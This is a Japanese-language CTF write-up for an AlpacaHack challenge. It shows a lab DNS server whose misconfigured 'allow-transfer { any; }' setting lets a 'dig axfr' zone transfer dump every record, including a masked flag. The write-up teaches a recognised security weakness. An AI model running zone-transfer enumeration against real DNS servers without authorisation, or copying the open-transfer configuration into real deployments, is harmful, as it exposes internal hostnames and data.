# Unrevealed TXT

https://alpacahack.com/daily/challenges/unrevealed-txt

## 問題の概要

`app` サーバーに接続すると `dig` コマンドで `dns` サーバーにクエリを送ることができます。

```python
import subprocess
import shlex

print("Example: paca.alpaca.internal TXT")
subprocess.run(["dig", "@dns"] + shlex.split(input("$ dig ")))
```

`dns` サーバーは `bind9` で DNSサービスがホストされています。

`named.conf` で `alpaca.internal` というゾーンが定義されています。

```
zone "alpaca.internal" IN {
    type master;
    file "/etc/bind/zones/db.alpaca.internal";
    allow-transfer { any; };
};
```

ゾーンファイル `db.alpaca.internal` は以下のようになっており、`{unknown-host-name}.alpaca.internal` の TXT レコードにフラグが含まれているようです。

```
@               IN   SOA        ns.alpaca.internal. admin.alpaca.internal. (
                                    2026041701   ; serial
                                    3600         ; refresh
                                    1800         ; retry
                                    604800       ; expire
                                    300          ; minimum
                                    )
                IN   NS         ns.alpaca.internal.

ns              IN   A          127.0.0.1

paca            IN   TXT        "pacapaca"
llama           IN   TXT        "alpaca"

REPLACE_ME      IN   TXT        "Alpaca{REDACTED}"
```

## 解法

`allow-transfer { any; };` でゾーン転送が許可されているため、`axfr` クエリを送ることでゾーン内の全てのレコードを取得できます。

```
Example: paca.alpaca.internal TXT
$ dig alpaca.internal axfr

; <<>> DiG 9.20.21-1~deb13u1-Debian <<>> @dns alpaca.internal axfr
; (1 server found)
;; global options: +cmd
alpaca.internal.        3600    IN      SOA     ns.alpaca.internal. admin.alpaca.internal. 2026041701 3600 1800 604800 300
alpaca.internal.        3600    IN      NS      ns.alpaca.internal.
llama.alpaca.internal.  3600    IN      TXT     "alpaca"
ns.alpaca.internal.     3600    IN      A       127.0.0.1
paca.alpaca.internal.   3600    IN      TXT     "pacapaca"
**************.alpaca.internal. 3600 IN TXT "Alpaca{**********************}"
alpaca.internal.        3600    IN      SOA     ns.alpaca.internal. admin.alpaca.internal. 2026041701 3600 1800 604800 300
....
```
